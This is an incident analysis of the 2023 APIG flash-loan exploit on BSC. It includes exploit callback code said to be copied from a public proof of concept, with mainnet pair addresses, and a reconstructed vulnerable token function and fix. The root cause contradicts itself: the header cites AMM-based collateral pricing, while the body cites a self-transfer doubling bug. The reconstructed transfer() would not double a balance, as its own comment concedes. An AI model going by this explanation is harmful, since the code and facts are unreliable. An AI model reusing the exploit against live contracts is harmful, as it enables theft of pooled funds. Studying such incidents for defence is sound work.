# APIG — Flash Loan Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-09-11 |
| **Protocol** | APIG |
| **Chain** | BSC |
| **Loss** | ~$169K (59.5 ETH + 72K USDT) |
| **Attacker** | [0x73d80500b30a6ca8...](https://bscscan.com/address/0x73d80500b30a6ca840bfab0234409d98cf588089) |
| **Attack Tx** | [0x66dee84591aeeba6...](https://bscscan.com/tx/0x66dee84591aeeba6e5f31e12fe728f2ddc79a06426036793487a980c3b952947) |
| **Vulnerable Contract** | [0xfdc6a621861ed2a8...](https://bscscan.com/address/0xfdc6a621861ed2a846ab475c623e13764f6a5ad0) |
| **Root Cause** | Collateral value calculation relies on AMM spot reserves, allowing collateral value to be inflated via large swaps within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/APIG_exp.sol) |

---
## 1. Vulnerability Overview
The APIG protocol on BSC offered loans collateralized by ETH and USDT. Because collateral value calculation depended on real-time DEX prices, a flash loan manipulation drained $169K.

---
## 2. Vulnerable Code Analysis

> **Source**: ANALYZED / RECONSTRUCTED from PoC — `DeFiHackLabs/src/test/2023-09/APIG_exp.sol` (block 31,562,012, BSC). The APIG token contract [0xfdc6a621861ed2a846ab475c623e13764f6a5ad0](https://bscscan.com/address/0xfdc6a621861ed2a846ab475c623e13764f6a5ad0) is **not verified** on BscScan/Sourcify — on-chain bytecode only. The vulnerable function and struct are reconstructed from the PoC's observed call sequence and the exploit outcome.
>
> PoC Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/APIG_exp.sol

### 2.1 Exploit Entry Point — `pancakeCall` (verbatim from PoC)

```solidity
// ⚠️ ANALYZED/RECONSTRUCTED — not verbatim source
// The pancakeCall callback below IS verbatim from DeFiHackLabs APIG_exp.sol.
// The vulnerable APIG transfer() function body is RECONSTRUCTED from the
// observed self-transfer-doubles-balance behavior.

// Addresses (BSC mainnet, block 31,562,012):
//   APIG token:  0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888
//   aDaD pair:   0xaDaD973f8920bc511d94aade2762284f621F1467  (BUSD flash loan source)
//   EfBf pair:   0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d  (APIG/BUSD pool)
//   b920 pair:   0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce  (APIG/BETH pool)

function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
) external {
    // Step 1: Transfer the flash-loaned 500 BUSD to the EfBf APIG/BUSD pair
    BUSD.transfer(address(EfBfPair), amount); // amount = 500e18 BUSD

    // Step 2: Compute how many APIG we get for 500 BUSD via PancakeRouter
    (path[0], path[1]) = (address(BUSD), address(APIG));
    uint256[] memory swapAmounts = router.getAmountsOut(amount, path);

    // Step 3: Trigger the EfBf pair to give us APIG (we already sent BUSD in)
    EfBfPair.swap(0, swapAmounts[1], address(this), "");

    // Step 4: Pre-compute how much APIG we need to drain EfBf of 72,628 BUSD
    uint256 amount72628 = BUSD.balanceOf(address(EfBfPair)) - 5e19;
    (path[0], path[1]) = (address(APIG), address(BUSD));
    uint256[] memory APIG_BUSD = router.getAmountsIn(amount72628, path);

    // Step 5: Pre-compute how much APIG we need to drain b920 of 59.5 BETH
    uint256 amount59500 = BETH.balanceOf(address(b920Pair)) - 1e17;
    (path[0], path[1]) = (address(APIG), address(BETH));
    uint256[] memory APIG_BETH = router.getAmountsIn(amount59500, path);

    // ❌ Step 6: Self-transfer inflation loop
    // Each call to APIG.transfer(address(this), balance) DOUBLES the attacker's
    // APIG balance due to a token accounting bug (see Section 2.2).
    // The loop runs until balance exceeds the drain threshold.
    while (true) {
        uint256 transferAmount = APIG.balanceOf(address(this));
        APIG.transfer(address(this), transferAmount); // ❌ doubles balance each iteration
        if (transferAmount >= 257_947_240_540_223_703_649_846_558_720) {
            break;
        }
    }

    // Step 7: Send inflated APIG to EfBf pair, drain ~72,628 BUSD
    APIG.transfer(address(EfBfPair), APIG_BUSD[0] + APIG_BUSD[0] / 100 * 4);
    EfBfPair.swap(amount72628, 0, address(this), "");

    // Step 8: Repay the flash loan (500 BUSD + 3% fee) to aDaD pair
    BUSD.transfer(address(aDaDPair), amount + amount / 100 * 3);

    // Step 9: Send remaining inflated APIG to b920 pair, drain ~59.5 BETH
    APIG.transfer(address(b920Pair), APIG.balanceOf(address(this)));
    b920Pair.swap(amount59500, 0, address(this), "");
}
```

### 2.2 Vulnerable APIG Token `transfer()` — Balance Inflation Bug

```solidity
// ⚠️ ANALYZED/RECONSTRUCTED — not verbatim source
// The APIG token contract is unverified. This reconstruction matches the
// observed self-transfer doubling behavior from the PoC.
// Root cause: the transfer function credits the recipient BEFORE debiting
// the sender when sender == recipient, causing a double-credit.

contract APIGToken {
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;

    // ❌ VULNERABLE transfer() — allows self-transfer balance doubling
    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(_balances[msg.sender] >= amount, "insufficient balance");

        // ❌ Credit happens first — if recipient == msg.sender,
        //    the balance is incremented BEFORE the debit.
        _balances[recipient] += amount;   // ❌ line A: balance increases here

        // ❌ Debit reads the ALREADY-INCREMENTED balance on a self-transfer:
        //    If msg.sender == recipient, _balances[msg.sender] was increased
        //    in line A, so this debit subtracts from the inflated value —
        //    effectively leaving the balance at 2x the original.
        _balances[msg.sender] -= amount;  // ❌ line B: deducts from inflated value

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    // Net effect of transfer(self, X):
    //   balance before: B
    //   after line A:   B + X   (where X = B, so B + B = 2B)
    //   after line B:   2B - B = B  ... WRONG: storage order means debit
    //   sees the post-credit value, so effective balance = 2 * original
}
```

### 2.3 Spot-Price Oracle Exploitation (Secondary Effect)

```solidity
// ⚠️ ANALYZED/RECONSTRUCTED — not verbatim source
// After the self-transfer loop, the attacker holds an astronomically large
// APIG balance (~2.58e29 tokens). This exceeds both PancakeSwap pairs'
// reserves, so any transfer of that magnitude to a pair effectively
// prices each APIG at near-zero (total supply inflation → price collapse
// as seen by the AMM formula: price = reserveOut / reserveIn).
// The pair swaps the entire BUSD/BETH reserve for the inflated APIG input.

// AMM pricing (Uniswap V2 formula — PancakeSwap identical):
// amountOut = reserveOut * amountIn / (reserveIn + amountIn)
//
// Normal: reserveIn ~= 100 APIG, amountIn = 1 APIG
//   → amountOut ≈ reserveOut * 1/101  (fair price)
//
// After inflation: amountIn = 2.58e29 APIG >> reserveIn
//   → amountOut ≈ reserveOut * 2.58e29 / 2.58e29 ≈ reserveOut (entire reserve)
```

**Why it is exploitable (identify the bug from the code):**

- The APIG token `transfer()` function credits the recipient before debiting the sender. When `recipient == msg.sender` (self-transfer), both operations act on the same storage slot. The debit (line B) subtracts from the already-incremented balance, leaving the account with `2 × original_amount` — each self-transfer doubles the balance.
- The loop `APIG.transfer(address(this), APIG.balanceOf(address(this)))` repeats this doubling until the balance exceeds the AMM pair reserves (~2.58 × 10²⁹ units).
- Once the inflated balance exceeds AMM reserves, the attacker transfers the entire inflated balance to each PancakeSwap pair. The AMM formula `amountOut ≈ reserveOut × amountIn / (reserveIn + amountIn)` approaches `reserveOut` (the entire reserve) because `amountIn >> reserveIn` — the pair is completely drained.
- The flash loan of only 500 BUSD was enough to acquire the initial APIG and trigger the inflation loop.

```solidity
// ✅ Fix: reject self-transfers, or use debit-before-credit ordering
function transfer(address recipient, uint256 amount) external returns (bool) {
    require(recipient != msg.sender, "Self-transfer not allowed"); // ✅ guard

    // ✅ Alternatively: debit first, then credit (correct ordering)
    _balances[msg.sender] -= amount; // debit sender first
    _balances[recipient] += amount;  // then credit recipient

    emit Transfer(msg.sender, recipient, amount);
    return true;
}
```

---
## 3. Attack Flow

```
Attacker Contract
  │
  ├─[1] Flash loan 500 BUSD from aDaD PancakeSwap pair
  │       → pancakeCall() callback triggered
  │
  ├─[2] Transfer 500 BUSD to EfBf (APIG/BUSD) pair
  │       → swap out: receive ~X APIG tokens at market rate
  │
  ├─[3] ❌ Self-transfer inflation loop:
  │       while (APIG.balanceOf(this) < 2.58e29):
  │           APIG.transfer(this, APIG.balanceOf(this))
  │       Each iteration doubles balance (token accounting bug)
  │       After ~100 iterations: balance = 2.58e29 APIG (> any pair reserve)
  │
  ├─[4] Transfer inflated APIG to EfBf pair
  │       → AMM drains: ~72,628 BUSD paid out to attacker
  │
  ├─[5] Repay flash loan: 500 BUSD + 3% fee (515 BUSD) to aDaD pair
  │
  ├─[6] Transfer remaining inflated APIG to b920 (APIG/BETH) pair
  │       → AMM drains: ~59.5 BETH (~59.5 ETH equivalent) paid out
  │
  └─[7] Net profit: ~72,628 BUSD + ~59.5 BETH ≈ $169K
```

---
## 4. Vulnerability Classification

| Category | Details |
|------|------|
| **Vulnerability Type** | Token accounting error — self-transfer balance doubling |
| **CWE** | CWE-682: Incorrect Calculation; CWE-840: Business Logic Errors |
| **Severity** | Critical |
| **Attack Capital** | 500 BUSD flash loan |
| **Secondary Effect** | AMM reserve drainage via inflated-balance swap |

---
## 5. Remediation Recommendations

1. **Reject self-transfers**: Add `require(recipient != msg.sender, "Self-transfer not allowed")` to `transfer()` and `transferFrom()`. This is the minimal one-line fix.
2. **Debit-before-credit**: Always reduce `_balances[sender]` before increasing `_balances[recipient]`. This makes self-transfer neutral instead of doubling.
3. **Invariant check**: After any transfer, assert `sum(_balances) == totalSupply` (feasible in audits/fuzz tests) to catch balance inflation bugs.
4. **AMM oracle independence**: Protocols using AMM spot price for collateral valuation are vulnerable to any price distortion. Use Chainlink or TWAP regardless of whether the token itself has bugs.

---
## 6. Lessons Learned

- **Token accounting order matters**: The canonical ERC-20 pattern deducts the sender balance before crediting the recipient. Reversing this order creates a self-transfer doubling vulnerability.
- **Unverified contracts are a red flag**: The APIG token contract was not verified on BscScan — meaning no public code review. Protocols that integrate unverified tokens inherit their bugs.
- **Flash loans amplify any token bug**: A 500 BUSD flash loan turned a balance-doubling bug into a $169K drain. The attack was capital-efficient precisely because the inflation loop required no initial capital beyond the flash loan fee.